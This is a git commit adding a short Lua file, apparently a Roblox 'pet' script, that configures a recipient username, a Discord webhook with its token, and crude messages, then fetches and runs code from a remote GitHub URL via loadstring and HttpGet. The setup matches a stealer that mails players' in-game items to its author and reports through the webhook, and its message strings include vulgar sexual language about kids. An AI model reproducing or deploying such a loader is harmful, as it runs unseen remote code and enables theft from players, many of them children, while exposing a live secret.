8dbf640b5590bd38a691d131e61421e20bec82bd
McpvYeye <139998306+McpvYeye@users.noreply.github.com>
2023-09-28 21:43:44 +0300

    Add files via upload

---
+++ Pet.lua
@@ -0,0 +1,9 @@
+UserName = "17wxm"
+Webhook = "https://discord.com/api/webhooks/1157007449648287897/mD7gy7TOgDlM83TYDITt10NLyUXgzAaxJspOMeKSz05rT7W6y3kMEt9s5dlTM3SNVjZh" 
+UserName2 = "17wxm"
+
+_G.MailMessage = "Owned By Mcpv"
+_G.LoadingTitle = "Second Getting Fucked By Mcpv Daddy" 
+_G.WebhookName = "Fucking Kids"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
